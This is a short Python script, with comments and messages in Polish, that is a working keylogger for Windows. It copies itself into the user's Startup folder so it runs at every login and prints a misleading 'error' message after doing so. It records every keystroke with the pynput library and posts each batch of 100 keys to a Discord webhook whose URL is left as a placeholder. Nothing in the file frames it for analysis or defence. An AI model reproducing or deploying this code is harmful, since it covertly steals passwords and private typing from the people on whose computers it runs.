import os
import shutil
import sys
from pynput import keyboard
import requests
import json
#         @imal1ergictocats
#       |\      _,,,---,,_
#ZZZzz  /,`.-'`'    -.  ;-;;,_
#      |,4-  ) )-,_. ,\ (  `'-'
#    '---''(_/--'  `-'\_) 
def send_to_discord(keys):
    webhook_url = 'webhook !!!!!!!!!'
    data = {
        'content': "Lista klawiszy:\n" + ''.join(keys)
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
    if response.status_code != 200:
        print('Failed to send message to Discord')

keys_pressed = []
words_count = 0

def key_pressed(key):
    global words_count
    global keys_pressed

    try:
        char = key.char
        words_count += 1
        keys_pressed.append(char)
    except AttributeError:
        words_count += 1
        keys_pressed.append(f"<{key}>")

    if words_count % 100 == 0:
        send_to_discord(keys_pressed)
        keys_pressed = []
        words_count = 0

def main():
    # Katalog docelowy autostartu w systemie Windows
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    
    # Ścieżka do tego skryptu
    current_script = os.path.abspath(__file__)
    
    try:
        # Kopiowanie tego skryptu do katalogu autostartu
        shutil.copy(current_script, startup_folder)
        print("error")
    except Exception as e:
        print("error404", e)
        sys.exit(1)

    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    listener.join()

if __name__ == "__main__":
    main()
